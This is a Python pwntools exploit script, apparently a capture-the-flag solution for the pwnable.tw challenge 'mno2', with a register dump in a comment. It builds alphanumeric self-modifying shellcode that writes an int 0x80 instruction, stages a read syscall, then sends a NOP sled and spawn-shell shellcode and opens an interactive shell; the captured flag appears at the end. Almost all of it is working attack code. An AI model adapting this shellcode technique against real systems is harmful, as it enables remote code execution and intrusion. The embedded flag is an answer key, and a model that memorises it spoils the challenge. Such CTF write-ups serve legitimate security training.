from pwn import *
import time


'''
$eax   : 0x324f6e4d  →  call rax
$ebx   : 0x0
$ecx   : 0x0
$edx   : 0x8048890  →  0x65480048 ("H"?)
$esp   : 0xffffd0d0  →  0x324f6e53  →  0x00000000
$ebp   : 0xffffd108  →  0x00000000
$esi   : 0xf7fb9000  →  0x001ead6c
$edi   : 0xf7fb9000  →  0x001ead6c
$eip   : 0x80487e8  →  <main+167> call eax
'''

#r = process('./mno2')
r = remote('chall.pwnable.tw',10301)

### make ax=0xffff
payload =  b'SSSSSSSS'  # push ebx * 8
payload += b'Ga'        # inc edi ; popa
payload += b'H'         # dec eax

### ax = 0xffff ^ 0x4832 ^ 0x3739 = 0x80f4
payload += b'Cf52H'     # inc ebx ; xor ax, 0x4832
payload += b'Cf597'     # inc ebx ; xor ax, 0x3739
payload += b'H'*39      # dec eax * 39 = 0x80cd

### write 0x80cd to memory  
payload += b'BhCoO2'    # inc edx ; push 0x324f6f43
payload += b'Zr1'       # pop edx ; jb 0x1
payload += b'Cf1B1'     # inc ebx ; xor word ptr [edx+0x31], ax

###  set up read syscall 

#### set eax = 3
payload += b'S'*8       # push ebx * 8
payload += b'Ga'        # inc edi ; popa

#### set ecx to somewhere in memory before int 0x80   
payload += b'BhCoO2'    # inc edx ; push 0x324f6f43
payload += b'Y'         # pop ecx

#### set edx to large number
payload += b'BhCoO1'    # inc edx ; push 0x314f6f43
payload += b'Zr1'       # pop edx ; jb 0x1

#### set ebx = 0
payload += b'K' * 3     # dec ebx * 3

### fill dummy op before int 0x80
payload += b'N' * 192
r.sendline(payload)
time.sleep(1)

### fill nop before int 0x80 and pop shell
shellcode = b'\x90'*52 + asm(shellcraft.sh())
r.send(shellcode)

r.interactive()
#FLAG{4(7|-||>4|_||\||>|>|_|4|\/|(|\/|b|<(|=35|=|\/||\/|d|\|0|_.-}